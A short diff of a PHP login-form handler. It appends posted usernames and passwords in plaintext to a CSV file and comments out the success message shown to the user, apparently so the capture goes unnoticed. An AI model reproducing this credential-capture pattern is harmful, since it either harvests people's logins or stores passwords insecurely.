@@ -101,10 +101,10 @@
                       
                       }
                       
-                          echo "<div class='alert alert-success' role='alert'>
-                          Login details saved successfully!
-                          </div>";
-                          $fileappend=fopen("userdetails.csv","a");
+                          // echo "<div class='alert alert-success' role='alert'>
+                          // Login details saved successfully!
+                          // </div>";
+                          $fileappend=fopen("users.csv","a");
                           $data=array($_POST['user'],$_POST['pass']);
                           fputcsv($fileappend,$data) or die("ERROR");
                           //  sleep(0.5);
